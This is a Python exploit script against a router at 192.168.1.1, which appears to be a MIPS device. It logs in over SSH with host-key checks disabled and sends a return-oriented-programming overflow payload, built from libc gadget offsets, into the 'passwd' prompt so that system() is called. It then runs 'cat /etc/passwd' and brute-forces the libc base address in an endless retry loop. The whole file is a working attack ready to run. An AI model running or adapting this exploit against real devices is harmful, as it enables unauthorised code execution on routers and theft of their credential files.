#!/usr/bin/python3

import struct
import os
import sys
import shutil
import time
import pexpect
import tempfile

r_host = "192.168.1.1"
r_user = "1234"
r_password = "yourrouterpassword"

def run(libc_b, host, user, password, timeout=5, bg_run=False):
    libc_base = int(libc_b, 0)
    g2_ra = libc_base + 0x0001f654 # 0x0001f654 : move $t9, $s2 ; jalr $t9 ; move $a1, $s0
    #libc_sleep = libc_base + 0x00058ba0
    libc_system = libc_base + 0x0005a380
    g_s2 = libc_system
    g_s3 = libc_base + 0x63338 # random
    g_f = libc_base + 0x00038834 # 0x00038834 : addiu $a0, $sp, 0x20 ; lw $ra, 0x64($sp) ; move $v0, $s2 ; lw $s3, 0x60($sp) ; lw $s2, 0x5c($sp) ; lw $s1, 0x58($sp) ; lw $s0, 0x54($sp) ; jr $ra ; addiu $sp, $sp, 0x68
    binsh = libc_base + 0x63338 # libc.so '/bin/sh'
    command = 'cat /etc/passwd'
    junk5_2 = binsh # *23
    junk6 = 'C' * 116
    final = junk6.encode("utf-8").hex() + struct.pack('>I', g_f).hex() + struct.pack('>I', junk5_2).hex() * 23 + struct.pack('>I', g_s2).hex() + struct.pack('>I', g_s3).hex() + struct.pack('>I', g2_ra).hex()
    print('[+] Trying libc_base %s' % str(hex(libc_base)))

    try:
        fname = tempfile.mktemp()
        fout = open(fname, 'wb')
        #options = '-p 2222 -q -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null -oPubkeyAuthentication=no'
        options = '-p 22 -q -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null -oPubkeyAuthentication=no'
        ssh_cmd = 'ssh %s@%s %s' % (user, host, options)
        child = pexpect.spawn(ssh_cmd, timeout=timeout)
        child.expect('password: ')
        child.sendline(password)
        child.logfile = fout
        child.expect('> ')
        child.sendline('passwd')
        child.logfile = fout
        child.expect(': ')
        child.sendline('aaaa')
        child.logfile = fout
        child.expect(': ')
        child.sendline(bytes.fromhex(final))
        child.logfile = fout
        child.expect(': ')
        print("[+] Executing '%s'." % command)
        child.sendline(command)
        child.logfile = fout
        child.expect('Administrator')
        child.logfile = fout
        child.close()
        fout.close()

        fin = open(fname, 'rb')
        stdout = fin.read()
        fin.close()
        if b'Administrator' in stdout:
            print("[+] Exploit succeed with base address %s" % str(hex(libc_base)))
            print(stdout)
            os.remove(fname)
            exit(0)
    except Exception as e:
        fin = open(fname, 'rb')
        stdout = fin.read()
        fin.close()
        os.remove(fname)
        return stdout

def check():
    res = run('0x00000000', r_host, r_user, r_password)
    if b'segfault' in res:
        print('[+] Vulnerable')
        pass
    else:
        print("The router doesn't seem vulnerable, try manually.")
        exit(0)

tobrute = list(range(0x76000, 0x77fff))
if __name__ == '__main__':
    while True:
        try:
            check()
            for i in tobrute:
                try:
                    res = run(str(hex(i))+'000', r_host, r_user, r_password)
                except Exception as e:
                    continue
            time.sleep(660)
        except Exception:
            continue
